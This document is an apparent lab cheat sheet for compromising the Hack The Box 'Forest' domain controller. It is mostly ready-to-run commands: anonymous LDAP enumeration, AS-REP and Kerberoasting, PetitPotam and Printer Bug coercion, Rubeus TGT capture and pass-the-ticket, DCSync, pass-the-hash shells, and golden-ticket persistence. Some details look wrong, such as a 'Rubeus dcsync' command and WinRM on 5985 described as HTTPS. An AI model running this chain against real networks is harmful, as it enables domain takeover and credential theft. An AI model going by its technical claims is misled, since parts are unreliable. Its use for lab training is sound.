# Tool Decision Guide: WHY and WHEN for Forest

---

## Decision Framework

```
BEFORE EACH TOOL, ASK:
├── What QUESTION am I answering?
├── What DATA do I need?
├── What ACCESS do I have? (anonymous / user / admin / SYSTEM)
├── What PROTOCOL speaks to the target?
└── What is the LEAST NOISY way?
```

---

## Phase 1: RECONNAISSANCE

### nmap
**WHEN:** First contact. Before any other tool.
**WHY:** 
- Discovers *what exists* (ports, services, versions, OS)
- `-sC` runs safe default scripts (enum shares, DNS, SSL certs)
- `-sV` grabs versions for CVE matching
- `-p-` catches non-standard ports (RPC dynamic range 49152-65535)
**Forest Specific:** Confirms DC role (ports 88, 389, 445, 3268), OS (Server 2016), domain name (htb.local)

```bash
# Decision: Full TCP + version + scripts + output
nmap -sS -sV -sC -p- -T4 -oA loot/nmap-full 10.129.95.210
```

**SKIP IF:** You already have recent scan data.

---

### ldapsearch (NOT nxc ldap yet)
**WHEN:** After nmap shows 389/636/3268 open. Before any authenticated tools.
**WHY:**
- **Anonymous bind** = zero credentials, zero logs on target (mostly)
- Returns *raw LDAP objects* - you see every attribute, not nxc's filtered view
- Critical for decoding `userAccountControl` bits manually (learning)
- Works even when nxc fails (different bind mechanics)
**Forest Specific:** Must confirm `FOREST$` has `userAccountControl: 532480` - the entire exploit hinges on this.

```bash
# Decision: Anonymous, wide query, raw LDIF for parsing
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(objectClass=user)" \
  cn sAMAccountName userAccountControl servicePrincipalName -o ldif-wrap=no > loot/users.ldif
```

**WHY NOT nxc ldap first?** nxc summarizes. You need to *see the bits* to learn. Use nxc after to verify.

---

### nxc ldap / smb (NetExec)
**WHEN:** After manual ldapsearch. For speed/verification.
**WHY:**
- Faster enumeration (users, groups, computers, shares, GPOs)
- Built-in modules: `--users`, `--groups`, `--computers`, `--shares`, `--pass-pol`, `--gpo`
- SMB null session check: `--shares` with `-u '' -p ''`
- Password spray (rate-limited): `-u userlist -p 'Password1'`
**Forest Specific:** Verify anonymous LDAP bind works, check share perms, confirm no user SPNs.

```bash
# Decision: Verify enum quickly, check SMB null session
nxc ldap 10.129.95.210 -u '' -p '' --users --groups --computers
nxc smb 10.129.95.210 -u '' -p '' --shares
```

**SKIP IF:** Manual ldapsearch gave you everything.

---

## Phase 2: KERBEROS ENUMERATION (No Creds)

### GetNPUsers.py (AS-REP Roasting)
**WHEN:** You have user list (from ldapsearch). Before any password attacks.
**WHY:**
- Requests AS-REP for users *without* pre-authentication (`DONT_REQUIRE_PREAUTH`)
- Returns hash crackable offline (mode 18200 / 7500)
- **Anonymous** (`-no-pass`) - no account lockout risk
**Forest Specific:** Run to *confirm nothing found*. Documents "not vulnerable."

```bash
# Decision: Test AS-REP roast anonymously
GetNPUsers.py htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile loot/users.txt -format hashcat -outputfile loot/asrep.txt
```

**WHEN TO SKIP:** If ldapsearch shows no user has `userAccountControl & 4194304`.

---

### GetUserSPNs.py (Kerberoasting)
**WHEN:** You have user list. After AS-REP check.
**WHY:**
- Requests TGS for SPNs → offline crack (mode 13100 / 1800)
- `-machine-only` targets computer accounts (often have SPNs, weaker passwords)
- `-request` actually requests tickets (vs just listing SPNs)
**Forest Specific:** Only machine accounts (FOREST$, EXCH01$) have SPNs. Documents "no user SPNs."

```bash
# Decision: Check for Kerberoastable accounts (user + machine)
GetUserSPNs.py htb.local/ -dc-ip 10.129.95.210 -no-pass -request -outputfile loot/kerberoast.txt
GetUserSPNs.py htb.local/ -dc-ip 10.129.95.210 -no-pass -request -machine-only -outputfile loot/kerberoast-machine.txt
```

**WHEN TO SKIP:** If ldapsearch shows no `servicePrincipalName` on user objects.

---

## Phase 3: VULNERABILITY CONFIRMATION

### ldapsearch (Targeted)
**WHEN:** You suspect delegation misconfig. Need *proof*.
**WHY:** 
- Single query, single attribute, undeniable evidence
- `userAccountControl` is the source of truth
**Forest Specific:** The "smoking gun" for the entire attack.

```bash
# Decision: Surgical strike - one object, one attribute
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(sAMAccountName=FOREST\$)" userAccountControl
```

---

## Phase 4: COERCION (The Exploit Trigger)

### coercer.py (PetitPotam / EFSRPC)
**WHEN:** 
- Target is Server 2016/2019 (unpatched EFSRPC)
- You have network access to 445/135
- You want **Kerberos** authentication (not NTLM) because DC has unconstrained delegation
- You have a listener ready (Rubeus monitor)
**WHY:**
- EFSRPC `EfsRpcOpenFileRaw` forces DC to connect to YOUR UNC path
- DC authenticates via **Kerberos** (preferred) → sends AP-REQ with TGT
- Works **anonymously** on Forest
- More reliable than Printer Bug on newer builds

```bash
# Decision: Primary coercion method for Forest
# Run Rubeus monitor FIRST, then:
python3 ~/tools/coercer/coercer.py coerce -t 10.129.95.210 -l <YOUR_TUN0_IP> -u '' -p '' --method efsrpc
```

**WHY NOT NTLM Relay?** Forest has SMB signing **required**. NTLM relay fails. Kerberos coercion works because DC *must* accept Kerberos auth.

---

### PetitPotam.py (Direct EFSRPC)
**WHEN:** coercer fails or you want raw control.
**WHY:** Same protocol, simpler code, fewer dependencies.
**Forest Specific:** Fallback if coercer has issues.

```bash
# Decision: Fallback coercion
python3 ~/tools/PetitPotam/PetitPotam.py -d htb.local -u '' -p '' 10.129.95.210 <YOUR_TUN0_IP>
```

---

### SpoolSample / Printer Bug (MS-RPRN)
**WHEN:** 
- EFSRPC patched/blocked
- Print Spooler service running (default on Server 2016)
- You have Windows box for Rubeus + SpoolSample.exe
**WHY:** 
- `RpcRemoteFindFirstPrinterChangeNotificationEx` forces DC to notify attacker
- Triggers Kerberos auth to attacker's listener
- Older technique, still works on unpatched 2016

```powershell
# Decision: Alternative coercion (Windows-only tool)
# Terminal 1: Rubeus monitor
Rubeus.exe monitor /interval:5 /filteruser:FOREST$

# Terminal 2: Trigger
SpoolSample.exe 10.129.95.210 <YOUR_TUN0_IP>
```

**WHY NOT FIRST?** Requires Windows compile. coercer.py runs on Linux.

---

## Phase 5: TGT CAPTURE & USE

### Rubeus.exe (Windows ONLY)
**WHEN:** 
- Coercion triggered Kerberos auth to you
- You need to **extract TGT from AP-REQ** and **Pass-The-Ticket**
- You need **DCSync** using DC's context
**WHY:** 
- Only tool that monitors live Kerberos traffic + extracts TGT + PTT + DCSync in one
- `monitor` catches AP-REQ in real-time
- `ptt` injects TGT into current session
- `dcsync` uses DC's replication rights via DRsuAPI
**Forest Specific:** The *only* way to go from coercion → DCSync on Windows.

```powershell
# Decision: Full Kerberos weaponization (run in order)

# 1. MONITOR - MUST RUN BEFORE COERCION
Rubeus.exe monitor /interval:5 /filteruser:FOREST$

# 2. After coercion triggers, copy base64 ticket → PTT
Rubeus.exe ptt /ticket:<BASE64_FROM_MONITOR>

# 3. DCSync as DC
Rubeus.exe dcsync /user:htb\Administrator /domain:htb.local /dc:FOREST.htb.local

# 4. (Optional) Golden Ticket for persistence
Rubeus.exe golden /user:Administrator /domain:htb.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
```

**WHY NOT Impacket on Linux?** Impacket's `getST.py` + `secretsdump.py` *can* work but requires converting kirbi→ccache, clock sync, and is finicky. Rubeus is purpose-built.

---

### ticketConverter.py + secretsdump.py (Linux Alternative)
**WHEN:** 
- You captured TGT (kirbi) on Windows but want to DCSync from Linux
- Or you have DC's NTLM hash (from relay) not TGT
**WHY:** Cross-platform path.

```bash
# Decision: If you must stay on Linux

# TGT path (kirbi → ccache)
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass htb.local/FOREST\$@FOREST.htb.local -just-dc-user Administrator

# NTLM path (if you got hash via relay)
secretsdump.py -just-dc-user Administrator "htb.local/FOREST\$@10.129.95.210" -hashes :<DC_NTLM>
```

**WHY SECOND CHOICE?** Kerberos on Linux needs clock sync (<5 min skew), FQDN resolution, ccache management. More failure points.

---

## Phase 6: POST-EXPLOITATION / FLAG

### evil-winrm
**WHEN:** You have Administrator NTLM hash. Want interactive shell.
**WHY:** 
- Clean WinRM (5985) shell over HTTPS
- Pass-The-Hash native (`-H`)
- Better UX than psexec (no service install noise)
**Forest Specific:** WinRM open (5985), signing not required for auth.

```bash
# Decision: Preferred shell with hash
evil-winrm -i 10.129.95.210 -u Administrator -H <NTLM_HASH>
```

---

### psexec.py / wmiexec.py / smbexec.py / atexec.py (Impacket)
**WHEN:** 
- evil-winrm fails (WinRM blocked, creds work but not WinRM)
- Need specific execution method
**WHY:** Different lateral movement techniques:
| Tool | Protocol | Noise | Use When |
|------|----------|-------|----------|
| `psexec.py` | SMB (service install) | High (Event 7045) | Default fallback |
| `wmiexec.py` | WMI (DCOM/RPC) | Medium | SMB blocked, WMI open |
| `smbexec.py` | SMB (temp service) | Medium | No admin share access |
| `atexec.py` | Task Scheduler (RPC) | Low | Stealth needed |

```bash
# Decision: Fallback shells
psexec.py htb.local/Administrator@10.129.95.210 -hashes :<NTLM_HASH>
# or
wmiexec.py htb.local/Administrator@10.129.95.210 -hashes :<NTLM_HASH>
```

---

## Phase 7: PERSISTENCE (Post-Root)

### ticketer.py / Rubeus golden
**WHEN:** You have `krbtgt` hash (from DCSync). Want long-term access.
**WHY:** 
- Golden Ticket = forge TGT as ANY user, valid 10 years (default)
- Survives password changes
- `ticketer.py` (Linux) or `Rubeus golden` (Windows)

```bash
# Decision: Persistence
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain htb.local -user Administrator
# Use resulting .ccache with export KRB5CCNAME=...
```

---

## Tool Selection Decision Tree for Forest

```
START: Target 10.129.95.210
│
├─► nmap -sS -sV -sC -p- → Ports 88,389,445,3268 = AD DC
│
├─► ldapsearch (anon) → FOREST$ userAccountControl=532480
│       │
│       ├─► GetNPUsers.py → No AS-REP roast
│       ├─► GetUserSPNs.py → Only machine SPNs
│       └─► nxc smb/ldap → Verify null session, no shares
│
├─► VULN CONFIRMED: Unconstrained Delegation on DC
│
├─► COERCION CHOICE:
│       ├─► Primary: coercer.py (EFSRPC/PetitPotam) on Linux
│       │       └─► Requires: Rubeus monitor on Windows FIRST
│       └─► Fallback: SpoolSample (Printer Bug) on Windows
│
├─► TGT CAPTURE: Rubeus.exe monitor → ptt → dcsync (Windows)
│       └─► Alt: ticketConverter + secretsdump.py (Linux)
│
├─► DCSYNC OUTPUT: Administrator NTLM + krbtgt NTLM
│
├─► SHELL: evil-winrm -u Administrator -H <hash>
│       └─► Alt: psexec.py / wmiexec.py
│
└─► FLAGS: root.txt (Administrator Desktop)
```

---

## Summary: WHY Each Tool Exists in This Chain

| Tool | Question It Answers | Why Not Alternative |
|------|---------------------|---------------------|
| `nmap` | What's open? | None - always first |
| `ldapsearch` | What are the *exact* attribute values? | nxc summarizes; you need bits |
| `GetNPUsers` | Any AS-REP roastable users? | Documents negative result |
| `GetUserSPNs` | Any Kerberoastable SPNs? | Documents negative result |
| `coercer.py` | Can I force DC to auth to me via Kerberos? | Works anon, reliable, Linux-native |
| `Rubeus monitor` | Can I catch the DC's TGT in flight? | Only tool that does live Kerberos capture |
| `Rubeus ptt` | Can I use that TGT in my session? | Native Windows Kerberos API |
| `Rubeus dcsync` | Can I replicate hashes as DC? | Uses DC's replication rights via DRsuAPI |
| `evil-winrm` | Clean shell with hash? | WinRM open, less noise than psexec |
| `secretsdump.py` | DCSync from Linux? | Fallback if no Windows box |

---

## The "If This Fails" Matrix

| Failure Point | Pivot To |
|---------------|----------|
| coercer.py "access denied" | PetitPotam.py direct → Printer Bug (SpoolSample) |
| Rubeus monitor shows nothing | Check clock sync, filteruser=FOREST$, run monitor FIRST |
| Rubeus ptt "invalid ticket" | Verify base64 copy complete, clock skew <5 min |
| DCSync "access denied" | Verify PTT worked (`klist`), try secretsdump.py with ccache |
| evil-winrm fails | psexec.py → wmiexec.py → smbexec.py → atexec.py |
| No Windows for Rubeus | ticketConverter + secretsdump.py (harder, clock-sensitive) |

---

*Print this. When stuck, find your step in the decision tree. The tool choice follows the protocol logic.*